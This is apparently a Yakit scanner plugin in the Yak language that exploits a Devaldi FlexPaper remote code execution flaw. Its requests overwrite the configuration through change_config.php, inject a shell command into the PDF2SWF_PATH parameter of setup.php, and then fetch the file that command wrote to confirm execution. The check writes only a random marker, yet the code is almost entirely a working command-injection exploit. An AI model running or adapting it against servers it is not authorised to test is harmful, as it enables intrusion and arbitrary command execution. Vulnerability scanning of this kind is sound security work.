yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="Devaldi FlexPaper代码执行漏洞"
    severity=""
    type="漏洞"
    verifyStr = str.RandStr(6)
    fileName = str.RandStr(6)

    poc_url_r0= url + `/php/change_config.php`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`SAVE_CONFIG=1&PDF_Directory=a&SWF_Directory=config/&LICENSEKEY=a&SPLITMODE=a&RenderingOrder_PRIM=a&RenderingOrder_SEC=a
`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 302 || resp_r0.StatusCode == 200{
        r0_flag = true
    }

    poc_url_r1= url + `/php/change_config.php`
    req_r1, _ := http.NewRequest("POST",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`SAVE_CONFIG=1&PDF_Directory=a&SWF_Directory=config/&LICENSEKEY=a&SPLITMODE=a&RenderingOrder_PRIM=a&RenderingOrder_SEC=a
`),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 302 || resp_r1.StatusCode == 200{
        r1_flag = true
    }

    poc_url_r2= url + `/php/setup.php?step=2&PDF2SWF_PATH=printf%20`+ parseStr(verifyStr) +`%25%25`+ parseStr(verifyStr) +`%20%3e%20`+ parseStr(fileName) +``
    req_r2, _ := http.NewRequest("GET",poc_url_r2,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r2)
    resp_r2, err := http.Do(req_r2)
    die(err)
    bresp,_=http.dump(resp_r2)
    header, body = poc.Split(bresp)
    r2_flag = false
    if resp_r2.StatusCode == 200{
        r2_flag = true
    }

    poc_url_r3= url + `/php/`+ parseStr(fileName) +`pdf2swf`
    req_r3, _ := http.NewRequest("GET",poc_url_r3,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r3)
    resp_r3, err := http.Do(req_r3)
    die(err)
    bresp,_=http.dump(resp_r3)
    header, body = poc.Split(bresp)
    r3_flag = false
    if resp_r3.StatusCode == 200 && str.Contains(string(body),parseStr(parseStr(verifyStr + "%" + verifyStr))){
        r3_flag = true
    }

    poc_url=poc_url_r3
    if r0_flag && r1_flag && r2_flag && r3_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
help: Devaldi FlexPaper是新西兰Devaldi公司的一款基于Web的轻量级PDF文件查看组件。
